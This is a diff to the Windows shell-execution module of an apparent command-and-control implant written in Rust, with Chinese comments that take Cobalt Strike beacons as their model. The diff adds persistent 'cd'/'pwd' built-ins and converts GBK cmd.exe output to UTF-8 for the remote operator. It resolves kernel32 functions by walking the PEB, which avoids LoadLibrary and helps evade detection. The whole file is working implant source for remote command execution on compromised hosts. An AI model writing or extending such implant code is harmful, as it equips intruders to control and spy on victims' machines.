@@ -11,11 +11,16 @@
 //! no LoadLibrary is needed). The full 7-export table is resolved up front; if
 //! any single export is missing the call fails fast with `Response::Err` rather
 //! than transmuting a null pointer.
+//!
+//! 另外有两个中文 Windows 实测暴露的问题在这里就地解决:
+//! 1. cmd 输出是 GBK(CP936/OEM),返回前在 implant 侧转成 UTF-8(参照 CS)。
+//! 2. `cd`/`pwd` 拦截为内建命令,用 Get/SetCurrentDirectoryW 实现持久 CWD
+//!    (CreateProcessW 的 lpCurrentDirectory 是 NULL,子进程继承父 CWD)。
 
 #![cfg(target_os = "windows")]
 
 use core::ffi::c_void;
-use nyx_implant_core::heap::{String, Vec};
+use nyx_implant_core::heap::{vec, String, Vec};
 use nyx_implant_core::resolve::export_addr;
 use nyx_protocol::Response;
 
@@ -42,6 +47,11 @@ const HANDLE_FLAG_INHERIT: u32 = 0x0000_0001;
 /// `yes`, a compile loop) from growing the output Vec unbounded and OOMing the
 /// implant — a long-lived process that must survive many beacon cycles.
 const MAX_OUTPUT: usize = 1 << 20; // 1 MiB
+/// MultiByteToWideChar 的 CP_OEMCP:用系统 OEM 代码页解码(中文 Windows 即
+/// CP936/GBK,cmd.exe 管道输出的实际编码)。
+const CP_OEMCP: u32 = 1;
+/// WideCharToMultiByte 的 CP_UTF8:转换成 UTF-8 交给上游渲染。
+const CP_UTF8: u32 = 65001;
 
 // ---- Win32 function pointer types (x64 "system" calling convention) ----
 
@@ -77,6 +87,31 @@ type WaitForSingleObject = unsafe extern "system" fn(*mut c_void, u32) -> u32;
 type GetExitCodeProcess = unsafe extern "system" fn(*mut c_void, *mut u32) -> i32;
 type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;
 type SetHandleInformation = unsafe extern "system" fn(*mut c_void, u32, u32) -> i32;
+
+// 输出转码用(OEM/GBK → UTF-16 → UTF-8)
+type MultiByteToWideChar = unsafe extern "system" fn(
+    code_page: u32,
+    dw_flags: u32,
+    lp_multi_byte_str: *const u8,
+    cb_multi_byte: i32,
+    lp_wide_char_str: *mut u16,
+    cch_wide_char: i32,
+) -> i32;
+
+type WideCharToMultiByte = unsafe extern "system" fn(
+    code_page: u32,
+    dw_flags: u32,
+    lp_wide_char_str: *const u16,
+    cch_wide_char: i32,
+    lp_multi_byte_str: *mut u8,
+    cb_multi_byte: i32,
+    lp_default_char: *const u8,
+    lp_used_default_char: *mut i32,
+) -> i32;
+
+// cd/pwd 内建用(持久 CWD)
+type GetCurrentDirectoryW = unsafe extern "system" fn(u32, *mut u16) -> u32;
+type SetCurrentDirectoryW = unsafe extern "system" fn(*const u16) -> i32;
 
 // ---- Win32 structs ----
 
@@ -120,10 +155,111 @@ struct ProcessInformation {
 /// Execute `cmd.exe /C <args>` and return combined stdout+stderr as
 /// `Response::Output`. Any resolution/spawn failure becomes `Response::Err`.
 ///
+/// 入口先拦截 `pwd`/`cd`/`chdir` 内建命令(持久 CWD,不起 cmd 子进程);
+/// 其余命令走原有 `cmd.exe /C` 路径。
+///
 /// The whole body is `unsafe` — PEB-walk resolution dereferences raw module
 /// pointers, and every Win32 call here touches kernel handles.
 pub fn run_shell(args: &str) -> Response {
+    if let Some(resp) = unsafe { run_shell_builtin(args) } {
+        return resp;
+    }
     unsafe { run_shell_inner(args) }
+}
+
+/// 内建命令拦截(参照 CS beacon 行为)。每条 shell 原来都新起 `cmd.exe /C`,
+/// 导致 `cd` 不持久、`pwd` 根本不是 cmd 内建命令直接报错 —— 中文 Windows
+/// 实测暴露的问题。这里用 Get/SetCurrentDirectoryW 直接操作 beacon 进程自身
+/// 的 CWD;由于 CreateProcessW 的 lpCurrentDirectory 传 NULL,后续 shell 的
+/// cmd 子进程会继承这个 CWD,从而实现持久。
+///
+/// 返回 `Some(Response)` 表示命中内建已处理;`None` 表示不是内建命令,
+/// 调用方走原有 cmd 路径。
+///
+/// # Safety
+/// PEB-walk 解析 export 并 transmute 成函数指针调用。
+unsafe fn run_shell_builtin(args: &str) -> Option<Response> {
+    let trimmed = args.trim();
+    // 拆出命令名(cmd 内建命令不区分大小写)
+    let (cmd, rest) = match trimmed.find(|c: char| c.is_ascii_whitespace()) {
+        Some(i) => (&trimmed[..i], trimmed[i..].trim()),
+        None => (trimmed, ""),
+    };
+    let mut lower: String = String::with_capacity(cmd.len());
+    lower.extend(cmd.chars().map(|c| c.to_ascii_lowercase()));
+    match lower.as_str() {
+        "pwd" => Some(run_shell_get_cwd()),
+        "cd" | "chdir" => {
+            if rest.is_empty() {
+                // 裸 `cd`:cmd 语义是打印当前目录,与 pwd 一致
+                Some(run_shell_get_cwd())
+            } else {
+                // 兼容 `cd /d X`(跨盘符切换);/d 不区分大小写
+                let path = rest
+                    .strip_prefix("/d")
+                    .or_else(|| rest.strip_prefix("/D"))
+                    .map(str::trim)
+                    .unwrap_or(rest);
+                // 剥掉包裹路径的双引号("C:\Program Files\..." 这类含空格路径)
+                let path = path
+                    .strip_prefix('"')
+                    .and_then(|p| p.strip_suffix('"'))
+                    .unwrap_or(path);
+                Some(run_shell_set_cwd(path))
+            }
+        }
+        _ => None,
+    }
+}
+
+/// 用 GetCurrentDirectoryW 取 beacon 进程当前目录,转成 UTF-8 返回。
+/// 解析/调用失败优雅降级为 Response::Err,不 panic。
+///
+/// # Safety
+/// 同 [`run_shell_builtin`]。
+unsafe fn run_shell_get_cwd() -> Response {
+    let get_cwd: GetCurrentDirectoryW = match export_addr(b"kernel32.dll", b"GetCurrentDirectoryW")
+    {
+        Some(a) => core::mem::transmute(a),
+        None => return Response::Err(String::from("shell: GetCurrentDirectoryW unresolved")),
+    };
+    // 两段式:第一次拿长度(返回值含 NUL),再分配缓冲读取
+    let len = get_cwd(0, core::ptr::null_mut());
+    if len == 0 {
+        return Response::Err(String::from("shell: GetCurrentDirectoryW failed"));
+    }
+    let mut buf: Vec<u16> = vec![0u16; len as usize];
+    let written = get_cwd(len, buf.as_mut_ptr());
+    if written == 0 {
+        return Response::Err(String::from("shell: GetCurrentDirectoryW failed"));
+    }
+    // 第二次调用的返回值不含 NUL,截断后转 UTF-8
+    buf.truncate(written as usize);
+    Response::Output(String::from_utf16_lossy(&buf).into_bytes())
+}
+
+/// 用 SetCurrentDirectoryW 设置 beacon 进程 CWD(支持 `cd ..`、`cd \` 等
+/// 相对/绝对路径,由 Windows 自己解析),成功后回读新 CWD 返回给操作员。
+///
+/// # Safety
+/// 同 [`run_shell_builtin`]。
+unsafe fn run_shell_set_cwd(path: &str) -> Response {
+    let set_cwd: SetCurrentDirectoryW = match export_addr(b"kernel32.dll", b"SetCurrentDirectoryW")
+    {
+        Some(a) => core::mem::transmute(a),
+        None => return Response::Err(String::from("shell: SetCurrentDirectoryW unresolved")),
+    };
+    // 操作员输入是 UTF-8,转 UTF-16 + NUL 交给 W API
+    let mut wide: Vec<u16> = Vec::with_capacity(path.len() + 1);
+    wide.extend(path.encode_utf16());
+    wide.push(0);
+    if set_cwd(wide.as_ptr()) == 0 {
+        return Response::Err(String::from(
+            "shell: cd failed (path not found or inaccessible)",
+        ));
+    }
+    // 设置成功后回读规范化后的真实 CWD
+    run_shell_get_cwd()
 }
 
 unsafe fn run_shell_inner(args: &str) -> Response {
@@ -433,10 +569,93 @@ unsafe fn run_shell_inner_reap(
     out
 }
 
+/// 中文 Windows 实测:cmd.exe 管道输出是 GBK(CP936/OEM 代码页)原始字节,
+/// 上游当 UTF-8 渲染全是 `` 乱码。参照 Cobalt Strike 的做法在 implant 侧
+/// 转 UTF-8:先用 `from_utf8` 探测 —— 已是合法 UTF-8(纯 ASCII 也算,也兼容
+/// 自己输出 UTF-8 的工具)就零开销透传;否则走
+/// MultiByteToWideChar(CP_OEMCP) + WideCharToMultiByte(CP_UTF8) 两段转换。
+/// export 解析失败或任何一次转换失败都优雅降级返回原始字节,绝不 panic
+/// 崩 beacon(no_std 下用 alloc Vec,先调一次拿长度再分配)。
+///
+/// # Safety
+/// PEB-walk 解析 export 并 transmute 成函数指针,对原始字节缓冲调用。
+unsafe fn run_shell_inner_transcode(out: Vec<u8>) -> Vec<u8> {
+    // 空输出或已是合法 UTF-8(含纯 ASCII):直接透传
+    if out.is_empty() || core::str::from_utf8(&out).is_ok() {
+        return out;
+    }
+    let mb_to_wide: MultiByteToWideChar = match export_addr(b"kernel32.dll", b"MultiByteToWideChar")
+    {
+        Some(a) => core::mem::transmute(a),
+        None => return out, // 解析失败:降级返回原始字节
+    };
+    let wide_to_mb: WideCharToMultiByte = match export_addr(b"kernel32.dll", b"WideCharToMultiByte")
+    {
+        Some(a) => core::mem::transmute(a),
+        None => return out,
+    };
+    // 第一段:OEM/GBK → UTF-16。先拿宽字符长度,再分配转换。
+    let wlen = mb_to_wide(
+        CP_OEMCP,
+        0,
+        out.as_ptr(),
+        out.len() as i32,
+        core::ptr::null_mut(),
+        0,
+    );
+    if wlen <= 0 {
+        return out;
+    }
+    let mut wide: Vec<u16> = vec![0u16; wlen as usize];
+    let written_w = mb_to_wide(
+        CP_OEMCP,
+        0,
+        out.as_ptr(),
+        out.len() as i32,
+        wide.as_mut_ptr(),
+        wlen,
+    );
+    if written_w <= 0 {
+        return out;
+    }
+    wide.truncate(written_w as usize);
+    // 第二段:UTF-16 → UTF-8。同样先拿字节长度再分配。
+    // CP_UTF8 下 dwFlags/lpDefaultChar/lpUsedDefaultChar 必须为 0/NULL。
+    let blen = wide_to_mb(
+        CP_UTF8,
+        0,
+        wide.as_ptr(),
+        written_w,
+        core::ptr::null_mut(),
+        0,
+        core::ptr::null(),
+        core::ptr::null_mut(),
+    );
+    if blen <= 0 {
+        return out;
+    }
+    let mut utf8: Vec<u8> = vec![0u8; blen as usize];
+    let written_b = wide_to_mb(
+        CP_UTF8,
+        0,
+        wide.as_ptr(),
+        written_w,
+        utf8.as_mut_ptr(),
+        blen,
+        core::ptr::null(),
+        core::ptr::null_mut(),
+    );
+    if written_b <= 0 {
+        return out;
+    }
+    utf8.truncate(written_b as usize);
+    utf8
+}
+
 /// Harvest the child's exit code, close every remaining handle (process +
 /// thread + pipe read — CreateProcessW opened both process handles and the
-/// read end is still ours), and wrap the captured output as
-/// `Response::Output`.
+/// read end is still ours), transcode OEM/GBK output to UTF-8, and wrap the
+/// captured output as `Response::Output`.
 ///
 /// # Safety
 /// Calls the resolved kernel32 exports on the raw process/pipe handles.
@@ -458,5 +677,6 @@ unsafe fn run_shell_inner_finish(
     close_handle(pi.h_thread);
     close_handle(child_std_out_read);
 
-    Response::Output(out)
+    // GBK/OEM → UTF-8 转码后包装返回(见 run_shell_inner_transcode 注释)
+    Response::Output(run_shell_inner_transcode(out))
 }
